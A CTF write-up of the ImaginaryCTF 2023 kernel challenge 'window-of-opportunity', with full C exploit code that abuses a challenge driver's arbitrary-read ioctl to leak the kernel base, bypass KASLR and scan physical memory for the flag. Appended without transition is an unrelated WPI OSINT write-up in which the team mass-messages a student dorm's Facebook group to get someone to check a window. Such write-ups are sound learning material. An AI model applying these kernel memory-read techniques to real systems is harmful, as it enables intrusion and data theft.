# window-of-opportunity

>window-of-opportunity (490 pts) - 11 solves  
>by Eth007  
>  
>Description: Sometimes, there is a glimmer of hope, a spark of inspiration, a
window of opportunity.  
>  
>Attachments  
>https://imaginaryctf.org/r/izYM0#opportunity_dist.zip  
>  
>nc window-of-opportunity.chal.imaginaryctf.org 1337

`window-of-opportunity` is a kernel exploitation challenge I did for the
[ImaginaryCTF 2023](https://2023.imaginaryctf.org). We are given an arbitrary
read primitive (and a stack buffer overflow but I didn't use it), and the goal
is basically to read the `/flag.txt` file. All the related files can be found
[there](https://github.com/ret2school/ctf/tree/master/2023/imaginaryctf/pwn/window).

![>...<](https://media.tenor.com/16jBhCDB9x8AAAAC/kyudo-japanese.gif)

**TLDR**:  
- Leaking with the help of the arbitrary read primitive the kernel base address by reading a pointer toward the .text stored within the fix-mapped `cpu_entry_area` mapping.  
- Using the read primitive to read the whole physmap to get the flag (given the initramfs is mapped directly in the physmap).  
- PROFIT

## Code review

We are given a classic `initramfs` setup for this kernel challenge, which
means we already know the whole `initramfs` will be mapped directly within the
physmap mapping off the kernel. If you are not familiar yet with the physmap I
advice you to read [this article](https://blog.wohin.me/posts/linux-kernel-
pwn-05/). Basically physmap is just a direct mapping of the whole physical
memory and it is mapped at a known location from the kernel base address. And
given the filesystem -- in our case the `initramfs` -- is directly mapped into
the physical memory we can access it from the physmap.

Let's take at the `ioctl` provided by the kernel driver we have to pwn:  
```c  
/* !! This is not the actual decompiled code, I rewrote it to make it easier
to read */

__int64 __fastcall device_ioctl(file *filp, __int64 cmd, unsigned __int64 arg)  
{  
 __int64 v3; // rbp  
 __int64 v4; // rdx  
 __int64 v5; // rbx  
 __int64 result; // rax  
 request req; // [rsp+0h] [rbp-120h] BYREF  
 unsigned __int64 v8; // [rsp+108h] [rbp-18h]  
 __int64 v9; // [rsp+118h] [rbp-8h]

 _fentry__(filp, cmd, arg);  
 v9 = v3;  
 v8 = __readgsqword(0x28u);  
 if ( (_DWORD)cmd == 0x1337 )  
 {  
   copy_from_user(&req, arg, 0x108LL);  
   result = (int)copy_to_user(arg.buf, req.ptr, 0x100LL);  
 }  
 else  
 {  
   result = -1LL;  
 }  
 if ( v8 != __readgsqword(0x28u) )  
   JUMPOUT(0xC3LL);  
 return result;  
}  
```

The structure used to exchange with the kernel driver looks like this:  
```c  
typedef struct request_s {  
   uint64_t kptr;  
   uint8_t buf[256];  
} request_t;  
```

Which means we have a very powerful arbitrary read primitive.

# Exploitation

To compile the exploit and pack the fs I used this quick and dirty command  if
you mind:  
```  
musl-gcc src/exploit.c -static -o initramfs/exploit && cd initramfs && find . -print0 | cpio --null -ov --format=newc > ../initramfs.cpio && cd .. && ./run.sh initramfs.cpio  
```

First let's take a look at the protection layout by using the `kchecksec`
developped by [@bata24](https://github.com/bata24) in his awesome [fork of
gef](https://github.com/bata24/gef).  
```  
gef> kchecksec  
------------------------------------------------------------------ Kernel information ------------------------------------------------------------------  
Kernel version                          : 5.19.0  
Kernel cmdline                          : console=ttyS0 oops=panic panic=1
kpti=1 kaslr quiet  
Kernel base (heuristic)                 : 0xffffffff9b600000  
Kernel base (_stext from kallsyms)      : 0xffffffff9b600000  
------------------------------------------------------------------- Register settings -------------------------------------------------------------------  
Write Protection (CR0 bit 16)           : Enabled  
PAE (CR4 bit 5)                         : Enabled (NX is supported)  
SMEP (CR4 bit 20)                       : Enabled  
SMAP (CR4 bit 21)                       : Enabled  
CET (CR4 bit 23)                        : Disabled  
-------------------------------------------------------------------- Memory settings --------------------------------------------------------------------  
CONFIG_RANDOMIZE_BASE (KASLR)           : Enabled  
CONFIG_FG_KASLR (FGKASLR)               : Unsupported  
CONFIG_PAGE_TABLE_ISOLATION (KPTI)      : Enabled  
RWX kernel page                         : Not found  
----------------------------------------------------------------------- Allocator -----------------------------------------------------------------------  
Allocator                               : SLUB  
CONFIG_SLAB_FREELIST_HARDENED           : Enabled (offsetof(kmem_cache,
random): 0xb8)  
-------------------------------------------------------------------- Security Module --------------------------------------------------------------------  
SELinux                                 : Disabled (selinux_init: Found,
selinux_state: Not initialized)  
SMACK                                   : Disabled (smack_init: Found,
smackfs: Not mounted)  
AppArmor                                : Enabled (apparmor_init: Found,
apparmor_initialized: 1, apparmor_enabled: 1)  
TOMOYO                                  : Disabled (tomoyo_init: Found,
tomoyo_enabled: 0)  
Yama (ptrace_scope)                     : Enabled (yama_init: Found,
kernel.yama.ptrace_scope: 1)  
Integrity                               : Supported (integrity_iintcache_init:
Found)  
LoadPin                                 : Unsupported (loadpin_init: Not
found)  
SafeSetID                               : Supported (safesetid_security_init:
Found)  
Lockdown                                : Supported (lockdown_lsm_init: Found)  
BPF                                     : Supported (bpf_lsm_init: Found)  
Landlock                                : Supported (landlock_init: Found)  
Linux Kernel Runtime Guard (LKRG)       : Disabled (Not loaded)  
----------------------------------------------------------------- Dangerous system call -----------------------------------------------------------------  
vm.unprivileged_userfaultfd             : Disabled
(vm.unprivileged_userfaultfd: 0)  
kernel.unprivileged_bpf_disabled        : Enabled
(kernel.unprivileged_bpf_disabled: 2)  
kernel.kexec_load_disabled              : Disabled
(kernel.kexec_load_disabled: 0)  
------------------------------------------------------------------------- Other -------------------------------------------------------------------------  
CONFIG_KALLSYMS_ALL                     : Enabled  
CONFIG_RANDSTRUCT                       : Disabled  
CONFIG_STATIC_USERMODEHELPER            : Disabled (modprobe_path: RW-)  
CONFIG_STACKPROTECTOR                   : Enabled (offsetof(task_struct,
stack_canary): 0x9c8)  
KADR (kallsyms)                         : Enabled (kernel.kptr_restrict: 2,
kernel.perf_event_paranoid: 2)  
KADR (dmesg)                            : Enabled (kernel.dmesg_restrict: 1)  
vm.mmap_min_addr                        : 0x10000  
```

What matters for us is mainly the KASLR that is on. Then, the first step will
be to defeat it.

## Defeat kASLR

To defeat kASLR we could use the trick already use a while ago by the hxp team
in one of their [kernel shellcoding challenge](https://hxp.io/blog/99/hxp-
CTF-2022-one_byte-writeup/). The idea would be to read through the
`cpu_entry_area` fix-mapped area, that is not rebased by the kASLR, a pointer
toward the kernel .text. Then giving us a powerful infoleak thats allows us to
find for example the address of the physmap. I just had to search a few
minutes the right pointer in gdb and that's it, at `0xfffffe0000002f50` is
stored a pointer toward `KERNEL_BASE + 0x1000b59`! Which gives:

```c  
   req.kptr = 0xfffffe0000002f50;  
   if (ioctl(fd, 0x1337, &req)) {  
       return -1;  
   }

   kernel_text =  ((uint64_t* )req.buf)[0] - 0x1000b59;  
   printf("[!] kernel .text found at %lx\n", kernel_text);  
```

## physmap for the win

Now we know where the kernel .text is we can deduce by it the addres of the
physmap and then we can simply look for the `icft` pattern while reading the
whole physmap. Which gives:  
```c  
   printf("[!] physmap at %lx\n", kernel_text + 0x2c3b000);

   while (1) {  
       req.kptr = kernel_text + 0x2c00000 + offt;  
       if (ioctl(fd, 0x1337, &req)) {  
           return -1;  
       }

       for (size_t i = 0; i < 0x100; i += 4) {  
           if (!memcmp(req.buf+i, "ictf", 4)) {  
               printf("flag: %s\n", (char* )(req.buf+i));  
           }  
       }

       offt += 0x100;  
   }  
```

## PROFIT

Finally here we are:  
```  
mount: mounting host0 on /tmp/mount failed: No such device  
cp: can't stat '/dev/sda': No such file or directory

Boot time: 2.78

---------------------------------------------------------------  
                    _                              
                   | |                             
      __      _____| | ___ ___  _ __ ___   ___     
      \ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \    
       \ V  V /  __/ | (_| (_) | | | | | |  __/_   
        \_/\_/ \___|_|\___\___/|_| |_| |_|\___(_)  
  
 Take the opportunity. Look through the window. Get the flag.  
---------------------------------------------------------------  
/ # ./exploit  
[!] kernel .text found at ffffffff8de00000  
[!] physmap at ffffffff90a3b000  
flag: ictf{th3_real_flag_was_the_f4ke_st4ck_canaries_we_met_al0ng_the_way}  
```

# Annexes

Final exploit:

```c  
#include <stdio.h>  
#include <stdlib.h>  
#include <inttypes.h>  
#include <sys/types.h>  
#include <sys/stat.h>  
#include <fcntl.h>  
#include <unistd.h>  
#include <sys/ioctl.h>  
#include <string.h>

typedef struct request_s {  
   uint64_t kptr;  
   uint8_t buf[256];  
} request_t;

int main()  
{  
   request_t req = {0};  
   uint64_t kernel_text = 0;  
   uint64_t offt = 0;

   int fd = open("/dev/window", O_RDWR);  
   if (fd < 0) {  
       return -1;  
   }

   req.kptr = 0xfffffe0000002f50;  
   if (ioctl(fd, 0x1337, &req)) {  
       return -1;  
   }

   kernel_text =  ((uint64_t* )req.buf)[0] - 0x1000b59;  
   printf("[!] kernel .text found at %lx\n", kernel_text);  
   printf("[!] physmap at %lx\n", kernel_text + 0x2c3b000);

   while (1) {  
       req.kptr = kernel_text + 0x2c00000 + offt;  
       if (ioctl(fd, 0x1337, &req)) {  
           return -1;  
       }

       for (size_t i = 0; i < 0x100; i += 4) {  
           if (!memcmp(req.buf+i, "ictf", 4)) {  
               printf("flag: %s\n", (char* )(req.buf+i));  
           }  
       }

       offt += 0x100;  
   }

   close(fd);  
   return 0;  
}  
```

Original writeup (https://ret2school.github.io/post/iwindow/).42.2739218 -71.8053364 are coordinates to WPI East Hall student accomodation.

v=65xiTGSSVcg is a youtube extension for From the Window to the Wall... DC
Metro Edition  
link: https://www.youtube.com/watch?v=65xiTGSSVcg

Our initial idea was to scan the youtube comments but that did not give
anything interesting.

The next option was to investigate the wall... the facebook wall for WPI East
Hall.

Again this was not fruitful but allowed us to gather alot of information about
these halls as well as revealing a facebook group for people living there
currently.  
link: https://www.facebook.com/groups/324274634667144/?source_id=48138809730

After a while of being rather stumped, a clue was released...  
Hint: Get on campus (physically)  
as well as: 'If any non-wpi students can get this one, let us know.'

This is an issue as we are in the UK.

Thus we began methodically messaging all 35 member of the facebook group with
the message:  
'Hello, this may seem like a weird question, but have you seen the words WPI{
something in here } on a window at east hall?'

At last after a few lengthy conversations, one person went outside and replied
with the flag:  
WPI{This Isnt the demoscene}